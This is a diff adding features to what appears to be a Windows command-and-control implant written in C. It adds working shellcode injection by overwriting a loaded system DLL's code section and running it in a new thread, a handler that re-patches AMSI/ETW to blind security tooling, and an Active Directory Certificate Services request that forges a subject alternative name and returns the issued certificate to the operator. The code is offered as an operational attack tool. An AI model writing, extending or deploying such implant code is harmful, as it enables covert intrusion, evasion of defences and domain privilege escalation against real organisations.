@@ -304,6 +304,64 @@ static void json_get_str(const char *json, const char *key, char *out, size_t ou
     out[i] = '\0';
 }
 
+// ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
+
+static char *shellcode_stomp(const uint8_t *sc, size_t sc_len, const char *dll_hint) {
+    static const char *auto_targets[] = {
+        "xpsservices.dll","clbcatq.dll","msasn1.dll","wbemprox.dll","wbemcomn.dll", NULL
+    };
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0);
+    if (snap == INVALID_HANDLE_VALUE) return _strdup("[-] shellcode_stomp: snapshot failed");
+
+    MODULEENTRY32 me; me.dwSize = sizeof(me);
+    LPVOID target_base = NULL; char target_name[64] = "";
+    if (Module32First(snap, &me)) {
+        do {
+            char low[MAX_MODULE_NAME32+2]; strncpy(low, me.szModule, sizeof(low)-1); CharLowerA(low);
+            int pick = 0;
+            if (dll_hint && dll_hint[0]) {
+                char hint_low[MAX_MODULE_NAME32+2]; strncpy(hint_low, dll_hint, sizeof(hint_low)-1); CharLowerA(hint_low);
+                pick = (strcmp(low, hint_low) == 0);
+            } else {
+                for (int i = 0; auto_targets[i]; i++) if (strcmp(low, auto_targets[i]) == 0) { pick=1; break; }
+            }
+            if (pick) { target_base = me.modBaseAddr; strncpy(target_name, me.szModule, sizeof(target_name)-1); break; }
+        } while (Module32Next(snap, &me));
+    }
+    CloseHandle(snap);
+    if (!target_base) return _strdup("[-] shellcode_stomp: target DLL not loaded");
+
+    /* Parse PE to locate .text section */
+    BYTE *base = (BYTE*)target_base;
+    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
+    BYTE *nt = base + e_lfanew;
+    WORD  num_secs  = *(WORD*)(nt + 6);
+    WORD  opt_sz    = *(WORD*)(nt + 20);
+    BYTE *sec       = nt + 24 + opt_sz;
+    DWORD text_rva = 0, text_sz = 0;
+    for (WORD i = 0; i < num_secs; i++, sec += 40) {
+        if (memcmp(sec, ".text", 5) == 0) {
+            text_sz  = *(DWORD*)(sec + 16);
+            text_rva = *(DWORD*)(sec + 12);
+            break;
+        }
+    }
+    if (!text_sz) { char *e=(char*)malloc(128); snprintf(e,128,"[-] shellcode_stomp: no .text in %s",target_name); return e; }
+
+    BYTE *write_addr = base + text_rva;
+    SIZE_T write_len = sc_len < text_sz ? sc_len : (SIZE_T)text_sz;
+    DWORD old; VirtualProtect(write_addr, write_len, PAGE_READWRITE, &old);
+    memcpy(write_addr, sc, write_len);
+    VirtualProtect(write_addr, write_len, PAGE_EXECUTE_READ, &old);
+
+    HANDLE ht = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)write_addr, NULL, 0, NULL);
+    if (!ht) { char *e=(char*)malloc(128); snprintf(e,128,"[-] shellcode_stomp: CreateThread failed %lu",GetLastError()); return e; }
+    CloseHandle(ht);
+    char *out = (char*)malloc(256);
+    snprintf(out, 256, "[+] shellcode_stomp: %s+0x%lX sc=%zu B \xe2\x86\x92 executing", target_name, (unsigned long)text_rva, sc_len);
+    return out;
+}
+
 // ── In-process shellcode execution (STAGE2) ──────────────────────────────────
 
 static char *inject_self(const uint8_t *sc, size_t sc_len) {
@@ -1762,6 +1820,15 @@ void dispatch_task(AgentTask *task) {
         char *out = inject_self(task->payload, task->payload_len);
         agent_send_result(task->id, out, ""); free(out);
     }
+    else if (strcmp(type_upper, "SHELLCODE_STOMP") == 0) {
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "SHELLCODE_STOMP: no shellcode payload"); return;
+        }
+        char dll_hint[128] = "";
+        json_get_str(task->args ? task->args : "", "dll", dll_hint, sizeof(dll_hint), "");
+        char *out = shellcode_stomp(task->payload, task->payload_len, dll_hint[0] ? dll_hint : NULL);
+        agent_send_result(task->id, out, ""); free(out);
+    }
     else if (strcmp(type_upper, "UDRL") == 0) {
         if (!task->payload || task->payload_len == 0) {
             agent_send_result(task->id, "", "UDRL: no shellcode payload"); return;
@@ -2086,6 +2153,10 @@ void dispatch_task(AgentTask *task) {
             agent_send_result(task->id, "[+] hardware breakpoints cleared", "");
         }
     }
+    else if (strcmp(type_upper, "AMSI_BYPASS") == 0) {
+        amsi_bypass();
+        agent_send_result(task->id, "[+] AMSI/ETW re-patched", "");
+    }
     else if (strcmp(type_upper, "WIPE_MZ") == 0) {
         HMODULE base = GetModuleHandleW(NULL);
         if (!base) {
@@ -2206,6 +2277,56 @@ void dispatch_task(AgentTask *task) {
     else if (strcmp(type_upper, "NET_USE_DEL") == 0) {
         char cmd[512]; snprintf(cmd,sizeof(cmd),"net use \"%s\" /delete /yes 2>&1", args?args:"");
         char *out = run_shell(cmd); agent_send_result(task->id, out?out:"", ""); free(out);
+    }
+    else if (strcmp(type_upper, "ADCS_REQUEST") == 0) {
+        char ca[256]="", tmpl[128]="", subj[256]="CN=user", san[256]="", out_path[512]="";
+        json_get_str(args,"ca",ca,sizeof(ca),"");
+        json_get_str(args,"template",tmpl,sizeof(tmpl),"");
+        json_get_str(args,"subject",subj,sizeof(subj),"CN=user");
+        json_get_str(args,"san",san,sizeof(san),"");
+        json_get_str(args,"out",out_path,sizeof(out_path),"");
+        DWORD pid = GetCurrentProcessId();
+        char inf[MAX_PATH], csr[MAX_PATH];
+        snprintf(inf,sizeof(inf),"C:\\Users\\Public\\adcs_%lu.inf",(unsigned long)pid);
+        snprintf(csr,sizeof(csr),"C:\\Users\\Public\\adcs_%lu.csr",(unsigned long)pid);
+        if (!out_path[0]) snprintf(out_path,sizeof(out_path),"C:\\Users\\Public\\adcs_%lu.cer",(unsigned long)pid);
+        char inf_buf[2048];
+        if (san[0])
+            snprintf(inf_buf,sizeof(inf_buf),"[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"%s\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=%s\r\nSAN=upn=%s\r\n",subj,tmpl,san);
+        else
+            snprintf(inf_buf,sizeof(inf_buf),"[Version]\r\nSignature=\"$Windows NT$\"\r\n\r\n[NewRequest]\r\nSubject = \"%s\"\r\nKeySpec = 1\r\nKeyLength = 2048\r\nExportable = TRUE\r\nMachineKeySet = FALSE\r\nRequestType = CMC\r\n\r\n[RequestAttributes]\r\nCertificateTemplate=%s\r\n",subj,tmpl);
+        FILE *fp = fopen(inf,"wb"); if(fp){fputs(inf_buf,fp);fclose(fp);}
+        char cmd1[1024], cmd2[1024];
+        snprintf(cmd1,sizeof(cmd1),"certreq -new \"%s\" \"%s\" 2>&1",inf,csr);
+        snprintf(cmd2,sizeof(cmd2),"certreq -submit -config \"%s\" \"%s\" \"%s\" 2>&1",ca,csr,out_path);
+        char *o1 = run_shell(cmd1);
+        char *o2 = run_shell(cmd2);
+        /* read cert and base64 encode */
+        char *cert_b64_line = (char*)calloc(1,1);
+        FILE *cf = fopen(out_path,"rb");
+        if (cf) {
+            fseek(cf,0,SEEK_END); long csz=(long)ftell(cf); rewind(cf);
+            if (csz>0) {
+                uint8_t *cbuf=(uint8_t*)malloc(csz);
+                if(cbuf && fread(cbuf,1,csz,cf)==(size_t)csz) {
+                    char *b64=b64_encode(cbuf,csz);
+                    if(b64){
+                        size_t b64sz=strlen(b64);
+                        free(cert_b64_line);
+                        cert_b64_line=(char*)malloc(b64sz+16);
+                        if(cert_b64_line) snprintf(cert_b64_line,b64sz+16,"\ncert_b64=%s",b64);
+                        free(b64);
+                    }
+                }
+                free(cbuf);
+            }
+            fclose(cf);
+        }
+        DeleteFileA(inf); DeleteFileA(csr);
+        char *full = (char*)malloc(strlen(o1?o1:"")+strlen(o2?o2:"")+strlen(cert_b64_line)+4);
+        if(full) sprintf(full,"%s\n%s%s",o1?o1:"",o2?o2:"",cert_b64_line);
+        agent_send_result(task->id, full?full:"", "");
+        free(o1); free(o2); free(cert_b64_line); free(full);
     }
     else if (strcmp(type_upper, "WHOAMI") == 0) {
         char *out = run_shell("whoami /all");
